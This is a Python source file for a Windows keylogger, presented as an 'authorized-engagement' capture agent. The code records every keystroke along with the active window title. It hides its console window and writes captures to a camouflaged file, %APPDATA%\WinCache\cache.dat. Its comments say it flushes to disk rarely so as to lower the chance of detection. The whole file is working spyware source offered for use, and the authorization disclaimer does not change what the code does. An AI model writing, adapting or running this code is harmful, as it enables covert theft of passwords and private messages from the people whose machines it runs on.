
"""
keylogger.py - authorized-engagement keystroke capture agent.
Run only on systems you are explicitly authorized to test.
"""

import os
import sys
import time
import threading
from datetime import datetime


LOG_DIR      = os.path.expandvars(r"%APPDATA%\WinCache")   
LOG_FILE     = os.path.join(LOG_DIR, "cache.dat")
FLUSH_EVERY  = 30          
MAX_LOG_SIZE = 2_000_000   

buffer = []
lock = threading.Lock()
last_window = ""

def ensure_dir():
    try:
        os.makedirs(LOG_DIR, exist_ok=True)
    except OSError:
        pass

def active_window_title():
    """Get foreground window title on Windows via ctypes (no heavy deps)."""
    try:
        import ctypes
        user32 = ctypes.windll.user32
        hwnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buf, length + 1)
        return buf.value
    except Exception:
        return ""

def flush_worker():
    """Periodically flush buffered keys to disk (low I/O = low detection)."""
    global buffer
    while True:
        time.sleep(FLUSH_EVERY)
        with lock:
            chunk, buffer = buffer, []
        if chunk:
            try:
                size = os.path.getsize(LOG_FILE) if os.path.exists(LOG_FILE) else 0
                if size > MAX_LOG_SIZE:
                    os.rename(LOG_FILE, LOG_FILE + "." + str(int(time.time())))
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    f.write("".join(chunk))
            except OSError:
                pass  

def on_press(key):
    global last_window
    try:
        char = key.char  
    except AttributeError:
        char = f"[{key.name.upper()}]"  

    
    win = active_window_title()
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"{char}"
    if win != last_window:
        entry = f"\n[{ts}] WINDOW: {win}\n" + entry
        last_window = win

    with lock:
        buffer.append(entry)

def main():
    ensure_dir()
    threading.Thread(target=flush_worker, daemon=True).start()

    
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.user32.ShowWindow(
            ctypes.windll.kernel32.GetConsoleWindow(), 0
        )

    from pynput import keyboard
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()

#cmd notepad %APPDATA%\WinCache\cache.dat